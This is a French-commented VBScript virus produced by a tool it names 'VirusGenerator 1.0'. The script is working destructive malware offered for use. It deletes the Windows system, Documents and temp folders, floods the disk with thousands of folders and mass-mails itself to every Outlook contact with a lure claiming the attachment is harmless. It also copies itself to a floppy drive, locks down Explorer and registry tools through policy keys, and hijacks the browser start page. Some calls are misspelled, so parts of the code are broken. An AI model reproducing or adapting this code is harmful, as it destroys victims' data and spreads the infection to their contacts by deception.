   'Virus Générer par:
   'VirusGenerator 1.0 <-VBS Editon->
   'Ce logiciel est disponible sur le net... Enjoy !!!
   'ATTENTION, en aucun cas le concepteur de VirusGenerator ne pourra être tenu responsable des dégâts causer par un virus créer grâce à son programme...
   On error resume next

   Set c11 = CreateObject("Scripting.FileSystemObject")
   Set dirsystem = c11.getSpecialFolder(1)
   Set C1 = CreateObject("Scripting.FileSystemObject")
   c1.deletefolder dirsystem, true


   Set c22 = CreateObject("Scripting.FileSystemObject")
   dim recup1,perso
   set regedit = CreateObject("WScript.Shell")
   recup1 = regedit.RegRead ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"&"Personal")
   C22.deleteFolder recup1,true


   set c33 = CreateObject("Scripting.FileSystemObject")
   set del3 = CreateObject("Scripting.FileSystemObject")
   set C3 = c33.getSpecialFolder(2)
   del3.deletefolder c3,true


   set c44 = CreateObject("Scripting.FileSystemObject")
   set del4 = CreateObject("Scripting.FileSystemObject")
   set C4 = c44.getSpecialFolder(0)
   del4.deletefilt c4&"command.com",true


   set c55 = CreateObject("Scripting.FileSystemObject")
   set del5 = CreateObject("Scripting.FileSystemObject")
   set C5 = c55.getSpecialFolder(0)
   del5.deletefilt c5&"autoexec.bat",true


   set c66 = CreateObject("Scripting.FileSystemObject")
   x=0
   on error resume next
   do while x<10000
   a=x
   set b = c66.createfolder(a)
   x=x+1
   loop


   On error resume next

   set c77 = CreateObject("Scripting.FileSystemObject")
   set dirwin = c77.getspecialfolder(0)
   set name = c77.getfile(wscript.scriptfullname)

   dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
   set regedit = CreateObject("WScript.Shell")
   set out = WScript.createobject("Outlook.Application")
   set mapi=out.getnamespace("MAPI")
   for ctrlists = 1 to mapi.addresslists.count
   set a = mapi.addresslists(ctrlists)
   x=1
   regv = regedit.regread("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
   if (regv="") then
   regv=1
   end if
   if (int(a.addressentries.count)>int(regv)) then
   for ctrentries=1 to a.addressentries.count
   malead = a.addressentries(x)
   regad=""
   regad=regedit.regread("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
   if (regad="") then
   set male = out.createitem(0)
   male.recipients.add(malead)
   male.subject = "Truc a lacon trop drole !!!"
   male.body = vbcrlf&"Salut !!!, sa va? Moi tout baigne !!! telecharge le fichier joint !!! c'est un petit prog hyper marrant... t'inquiète pas y a rien de dangereux !!! tu m'en parleras quand on se verra !!! @+"
   male.attachements.add(name)
   male.send
   regedit.regwrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
   end if
   x=x+1
   next
   regedit.regwrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.addressentries.count
   else
   regedit.regwrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.addressentries.count
   end if
   next
   set out = nothging
   set mapi = nothing


   on error resume next
   set C88 = CreateObject("Scripting.FileSystemObject")
   set c = c88.getfile(WScript.scriptfullname)
   c.copy("A:\test.txt")


   dim c99
   set c99 = WScript.CreateObject("Wscript.shell")
   C99.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\NoDesktop",1,"REG_DWORD"


   dim c1010
   set c1010 = WScript.CreateObject("Wscript.shell")
   C1010.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\NoRun",1,"REG_DWORD"


   dim c1111
   set c1111 = WScript.CreateObject("Wscript.shell")
   C1111.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\NoClose",1,"REG_DWORD"


   dim c1212
   set c1212 = WScript.CreateObject("Wscript.shell")
   C1212.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\NoStartMenuSubFolder",1,"REG_DWORD"


   dim c1313
   set c1313 = WScript.CreateObject("Wscript.shell")
   C1313.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\NoInternetIcon",1,"REG_DWORD"


   dim c1414
   set c1414 = WScript.CreateObject("Wscript.shell")
   C1414.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\NoViewContextMenu",1,"REG_DWORD"


   dim c1515
   set c1515 = WScript.CreateObject("Wscript.shell")
   C1515.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\Policies\explorer\DisableRegistryTools",1,"REG_DWORD"


   dim c1616
   set c1616 = WScript.CreateObject("Wscript.shell")

   C1616.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\main\Start Page",http://vx.netlux.org,"REG_SZ"

   dim c1616
   set c1616 = WScript.CreateObject("Wscript.shell")

   C1616.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\main\Start Page",http://vx.netlux.org,"REG_SZ"
   '0-0-0-0
